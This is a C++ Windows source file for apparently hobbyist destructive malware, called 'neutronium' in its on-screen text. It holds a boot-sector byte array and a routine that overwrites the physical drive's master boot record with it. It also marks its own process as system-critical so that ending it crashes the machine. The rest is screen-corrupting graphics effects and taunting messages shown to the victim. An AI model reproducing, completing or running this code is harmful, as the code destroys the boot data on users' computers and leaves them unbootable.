#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = {
    0x31, 0xC0, 0xB9, 0x14, 0x00, 0x50, 0xE2, 0xFD, 0x89, 0xE5, 0xB0, 0x02, 0xCD, 0x10, 0xE4, 0x40,
    0x96, 0xFC, 0xB8, 0x00, 0xB8, 0x8E, 0xD8, 0x8E, 0xC0, 0xE8, 0xF0, 0x00, 0x31, 0xC0, 0x89, 0x46,
    0x04, 0xB1, 0x0F, 0xE8, 0x38, 0x01, 0x8B, 0x7E, 0x04, 0xB8, 0x61, 0x00, 0xF7, 0xE6, 0x83, 0xC0,
    0x17, 0x96, 0x80, 0xE4, 0x03, 0x80, 0xC4, 0x31, 0x88, 0x63, 0x08, 0xB8, 0x08, 0x00, 0x83, 0xFF,
    0x05, 0x72, 0x09, 0xB0, 0x06, 0x83, 0xFF, 0x0D, 0x72, 0x02, 0xB0, 0x04, 0x89, 0x46, 0x06, 0x83,
    0xFF, 0x1F, 0x75, 0x03, 0xE9, 0x88, 0x00, 0xFE, 0x46, 0x04, 0x31, 0xFF, 0x8A, 0x43, 0x08, 0x57,
    0x88, 0x46, 0x02, 0xE8, 0xA6, 0x00, 0x8B, 0x4E, 0x06, 0xE8, 0xF2, 0x00, 0xE8, 0x15, 0x01, 0xC6,
    0x46, 0x02, 0x00, 0xE8, 0x96, 0x00, 0xE8, 0xE3, 0x00, 0x5F, 0x47, 0x3B, 0x7E, 0x04, 0x75, 0xDC,
    0xB4, 0x01, 0xCD, 0x16, 0x74, 0x06, 0xB4, 0x00, 0xCD, 0x16, 0xEB, 0xF4, 0x31, 0xFF, 0xB4, 0x00,
    0xCD, 0x16, 0x3C, 0x1B, 0x74, 0x6F, 0x3C, 0x31, 0x72, 0xF4, 0x3C, 0x35, 0x73, 0xF0, 0x50, 0x57,
    0x88, 0x46, 0x02, 0xE8, 0x66, 0x00, 0x8B, 0x4E, 0x06, 0xE8, 0xB2, 0x00, 0xE8, 0xD5, 0x00, 0xC6,
    0x46, 0x02, 0x00, 0xE8, 0x56, 0x00, 0xE8, 0xA3, 0x00, 0x5F, 0x58, 0x3A, 0x43, 0x08, 0x75, 0x09,
    0x47, 0x3B, 0x7E, 0x04, 0x75, 0xC8, 0xE9, 0x58, 0xFF, 0xB9, 0xF9, 0x6E, 0xE8, 0xA2, 0x00, 0xB1,
    0x1B, 0xE8, 0x8A, 0x00, 0xE8, 0xAD, 0x00, 0xB1, 0x1B, 0xE8, 0x82, 0x00, 0xE9, 0x3D, 0xFF, 0xB0,
    0x32, 0xB9, 0x0E, 0x00, 0x51, 0x50, 0x88, 0x46, 0x02, 0xE8, 0x20, 0x00, 0xB1, 0x02, 0xE8, 0x6D,
    0x00, 0xC6, 0x46, 0x02, 0x00, 0xE8, 0x14, 0x00, 0x58, 0x40, 0x3C, 0x35, 0x75, 0x02, 0xB0, 0x31,
    0x59, 0xE2, 0xE1, 0xEB, 0xC4, 0xB8, 0x02, 0x00, 0xCD, 0x10, 0xCD, 0x20, 0xBF, 0x66, 0x01, 0xBB,
    0x2F, 0x31, 0xB9, 0x39, 0x0B, 0xE8, 0x21, 0x00, 0xBF, 0x92, 0x01, 0xBB, 0x4F, 0x32, 0xB9, 0xFB,
    0x0E, 0xE8, 0x15, 0x00, 0xBF, 0x46, 0x08, 0xBB, 0x6F, 0x33, 0xB9, 0xCC, 0x12, 0xE8, 0x09, 0x00,
    0xBF, 0x72, 0x08, 0xBB, 0x3F, 0x34, 0xB9, 0x72, 0x16, 0xB0, 0x20, 0x3A, 0x7E, 0x02, 0x75, 0x05,
    0xE8, 0x2E, 0x00, 0xB0, 0xB0, 0xB9, 0x0A, 0x00, 0x51, 0x88, 0xDC, 0xB1, 0x14, 0xF3, 0xAB, 0x83,
    0xC7, 0x78, 0x59, 0xE2, 0xF3, 0x88, 0xF8, 0x89, 0x85, 0xF4, 0xFC, 0xC3, 0xB1, 0x01, 0xB5, 0x00,
    0x51, 0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x56, 0x00, 0x74, 0xF7, 0x89, 0x56, 0x00, 0x59, 0xE2, 0xF0,
    0xC3, 0xB0, 0xB6, 0xE6, 0x43, 0x88, 0xC8, 0xE6, 0x42, 0x88, 0xE8, 0xE6, 0x42, 0xE4, 0x61, 0x0C,
    0x03, 0xE6, 0x61, 0xC3, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F,
    0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x4F, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
    return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;
    result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
    return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

VOID WINAPI ci(int x, int y, int w, int h) {
    HDC hdc = GetDC(0);
    HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
    SelectClipRgn(hdc, hrgn);
    HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    SelectObject(hdc, hBrush);
    BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
    ReleaseDC(0, hdc);
    DeleteObject(hrgn); DeleteObject(hBrush);
}

DWORD WINAPI icocur(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(0);
        int sh = GetSystemMetrics(1);
        LPCWSTR lpCursors[] = { IDC_APPSTARTING, IDC_ARROW, IDC_CROSS, IDC_HAND, IDC_HELP, IDC_IBEAM, IDC_ICON, IDC_NO, IDC_SIZE, IDC_SIZEALL, IDC_SIZENESW, IDC_SIZENS, IDC_SIZENWSE, IDC_SIZEWE, IDC_UPARROW, IDC_WAIT };
        int CursorCount = rand() % 16;
        DrawIconEx(hdc, rand() % sw, rand() % sh, LoadIcon(0, MAKEINTRESOURCE(32512 + (rand() % 7))), (rand() % 10 + 1) * GetSystemMetrics(11), (rand() % 10 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        DrawIconEx(hdc, rand() % sw, rand() % sh, LoadCursor(0, lpCursors[CursorCount]), (rand() % 10 + 1) * GetSystemMetrics(11), (rand() % 10 + 1) * GetSystemMetrics(12), NULL, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI textout(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        LPCSTR text[9] = {
            "neutronium", "element 0", "GET R3KT", "stop strugging and crying.",
            "you can't do anything about it!" , "just give up, there's no hope!",
            "what were you thinking?", "it's all your fault!", "still using this computer?"
        };
        int thing = rand() % 9;
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        HFONT font = CreateFontA(45, 25, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, font);
        TextOutA(hdc, rand() % w, rand() % h, text[thing], strlen(text[thing]));
        ReleaseDC(0, hdc);
        DeleteObject(font);
        DeleteDC(hdc);
        Sleep(100);
    }
}

DWORD WINAPI wef(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int size = 400 + ((1 + rand() % 14) * 100);
        int x = rand() % (w + size) - size / 2;
        int y = rand() % (h + size) - size / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI wef1(LPVOID lpParam) {
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    while (true) {
        const int size = 5600;
        int x = w / 2, y = h / 2;
        for (int i = 0; i < size; i += 100) {
            ci(x - i / 2, y - i / 2, i, i);
            Sleep(10);
        }
    }
    return 0;
}

DWORD WINAPI shader1(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 50, 0 };
    int count = 0, sss = rand() % 255;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int rgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, !(rand() % 2) ? SRCAND : SRCPAINT);
        for (int x = 0; x < w; x += 35) {
            for (int y = 0; y < h; y += 35) {
                if (rand() % 8 != 1) {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 30, 30, !(rand() % 2) ? SRCINVERT : 0x999999);
                }
                else {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 30, 30, SRCERASE);
                };
            }
        }
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb += rgb - (((i % w) + (i / h) * sss) & 256);
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        if (count >= 15) { sss = rand() % 255; count = 0; }
        else { count++; }
        if (rand() % 15 == 14) InvalidateRect(0, 0, 0);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    int i = 0; float fx;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int rndsize = 1 + rand() % 40;
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int i = 0; i < h; i += rndsize) {
            StretchBlt(hcdc, -2 + (rand() % 5), i, w, rndsize, hcdc, 0, i, w, rndsize, SRCCOPY);
        }
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x, fx = (x * i) & (y * i); rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
                hslcolor.s = 1.f; hslcolor.l += .1f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
    return 0;
}

DWORD WINAPI shader3(LPVOID lpParam) {
    int blocksize = 80, increment = 40;
    POINT point[3];
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x <= w; x += blocksize) {
            for (int y = 0; y <= h; y += blocksize) {
                int rndx = x + (-1 + rand() % 3), rndy = y + (-1 + rand() % 3);
                int rndx2 = x + (-1 + rand() % 3), rndy2 = y + (-1 + rand() % 3);
                int luckynum = 1 + rand() % 12, rop = SRCCOPY;
                if (luckynum == 5) { rop = SRCAND; }
                else if (luckynum == 10) { rop = SRCPAINT; }
                StretchBlt(hcdc, rndx, rndy, blocksize, blocksize, hcdc, rndx2, rndy2, blocksize, blocksize, rop);
            }
        }
        for (int i = 0; i < w * h; i++) {
            rgbScreen[i].rgb += i * w & (i % w | i / h) | i & h;
        }
        if (rand() % 8 >= 5) { BitBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, !(rand() % 2) ? SRCAND : SRCPAINT); }
        if (rand() % 6 >= 4) {
            if (rand() % 10 >= 6) {
                point[0].x = increment; point[0].y = -increment;
                point[1].x = w + increment; point[1].y = increment;
                point[2].x = -increment; point[2].y = h - increment;
            }
            else {
                point[0].x = -increment; point[0].y = increment;
                point[1].x = w - increment; point[1].y = -increment;
                point[2].x = increment; point[2].y = h + increment;
            }
            PlgBlt(hcdc, point, hcdc, 0, 0, w, h, 0, 0, 0);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        blocksize += 5; if (blocksize >= 200) { blocksize = 80; }
    }
    return 0;
}

DWORD WINAPI blur(LPVOID lpParam) {
    BLENDFUNCTION blur = { AC_SRC_OVER, 0, 150, 0 };
    int rop = SRCCOPY, count = 0, angle = 0, power = 10, width = 80, height = 80;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 5) {
            StretchBlt(hcdc, -8 + rand() % 17, y, w, 5, hcdc, 0, y, w, 5, SRCCOPY);
        }
        for (int xxx = 0; xxx < w; xxx += width) {
            for (int yyy = 0; yyy < h; yyy += height) {
                int x = power * cos(angle * M_PI / 8.0), y = power * sin(angle * M_PI / 12.0);
                StretchBlt(hcdc, xxx, yyy, width - x, height - y, hcdc, xxx, yyy, width, height, rop);
            }
        }
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        count++; angle += M_PI / 2;
        if (angle > 365) { angle = 0; }
        if (count > 60) { count = 0; }
    }
}

DWORD WINAPI wave(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y += 50) {
            if (rand() % 10 == 8) {
                StretchBlt(hcdc, -5 + rand() % 10, y, w, 50, hcdc, 0, y, w, 50, !(rand() % 2) ? SRCAND : SRCPAINT);
            }
            else {
                StretchBlt(hcdc, -5 + rand() % 10, y, w, 50, hcdc, 0, y, w, 50, SRCCOPY);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    RGBQUAD rgbquadCopy; int i = 0;
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i * 4) * sqrt((x & y) * i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 200.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
}

DWORD WINAPI shader5(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int rndrgb = RGB(1 + rand() % 254, 1 + rand() % 254, 1 + rand() % 254);;
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 }; PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x += 35) {
            for (int y = 0; y < h; y += 35) {
                if (rand() % 8 != 1) {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 20, 20, SRCAND);
                }
                else {
                    StretchBlt(hcdc, x, y, 35, 35, hcdc, x, y, 20, 20, SRCPAINT);
                };
            }
        }
        for (int i = 0; i < w * h; i++) { rgbScreen[i].rgb %= rndrgb; }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
    return 0;
}

DWORD WINAPI shader6(LPVOID lpParam) {
    RGBQUAD rgbquadCopy;
    int i = 0, rop = SRCAND, rndsize = NULL, move = 30;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        int rndsize = 1 + rand() % 20;
        BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, -move, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        BitBlt(hcdc, w - move, 0, w, h, hcdc, 0, 0, NOTSRCCOPY);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, -move, NOTSRCCOPY);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, h - move, NOTSRCCOPY);
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = x * h + y, fx = (int)((i ^ 2) - (i * 2) * sqrt(i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 500.f + y / h * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        for (int y = 0; y < h; y += rndsize) {
            if (rand() % 10 >= 5) { rop = SRCAND; }
            else { rop = SRCPAINT; }
            StretchBlt(hcdc, 2 - (rand() % 5), y, w, rndsize, hcdc, 2 - (rand() % 5), y, w, rndsize, rop);
        }
        for (int kun = 0; kun < 4; kun++) {
            int rw = rand() % w, rh = rand() % h;
            int tw = 0 + rw, th = 0 + rh;
            int bw = 120 + rw, bh = 120 + rh;
            HRGN circle = CreateEllipticRgn(tw, th, bw, bh);
            InvertRgn(hcdc, circle);
            DeleteObject(circle);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
}

DWORD WINAPI shader7(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = w * y + x;
                int cx = x - (w / 2), cy = y - (h / 2), zx = (cx * cx), zy = (cy * cy), di = 128 + i;
                int fx = (int)di + (di * sin(sqrt(zx + zy) / 30));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
    return 0;
}

